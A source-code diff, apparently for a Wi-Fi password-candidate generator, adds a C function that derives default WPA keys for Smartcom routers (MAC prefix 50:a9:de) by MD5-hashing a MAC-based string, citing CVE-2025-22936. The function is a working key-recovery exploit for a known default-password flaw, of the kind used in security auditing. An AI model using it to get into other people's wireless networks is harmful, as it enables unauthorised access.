@@ -2410,6 +2410,50 @@ if(oui == 0x000559)
 return;
 }
 /*===========================================================================*/
+/* source: CVE-2025-22936, https://sec.stanev.org/advisories/Smartcom_default_WPA_password.txt */
+static void test50a9de(FILE *fhout, unsigned long long int macaddr)
+{
+static int i, j;
+static unsigned long long int part;
+static EVP_MD_CTX* mdctx;
+static uint8_t digestmd5[EVP_MAX_MD_SIZE];
+static unsigned int digestmd5len;
+static char message[21];
+
+part = macaddr & 0xffffff000000L;
+part = part >> 24;
+if(part == 0x50a9de)
+	{
+	mdctx = EVP_MD_CTX_create();
+	if(mdctx == NULL) return;
+
+	for (i = 0; i > -2; i--)
+		{
+		part = (macaddr + i) & 0xffffffffL;
+		snprintf(message, sizeof(message), "%08llxSmartcomWifi", part);
+		if(EVP_DigestInit_ex(mdctx, EVP_md5(), NULL) == 0)
+			{
+			EVP_MD_CTX_free(mdctx);
+			return;
+			}
+		if(EVP_DigestUpdate(mdctx, message, sizeof(message) - 1) == 0)
+			{
+			EVP_MD_CTX_free(mdctx);
+			return;
+			}
+		if(EVP_DigestFinal_ex(mdctx, digestmd5, &digestmd5len) == 0)
+			{
+			EVP_MD_CTX_free(mdctx);
+			return;
+			}
+	    for (j = 0; j < 4; j++) fprintf(fhout, "%02x", digestmd5[j]);
+	    fprintf(fhout, "\n");
+	    }
+    EVP_MD_CTX_free(mdctx);
+    }
+return;
+}
+/*===========================================================================*/
 static void preparebssid(FILE *fhout, unsigned long long int macaddr)
 {
 static int c;
@@ -2462,6 +2506,7 @@ swap = (nic >> 8) & 0xffff;
 	fprintf(fhout, "%s\n", pskstring);
 	}
 test000559(fhout, macaddr);
+test50a9de(fhout, macaddr);
 return;
 }
 /*===========================================================================*/
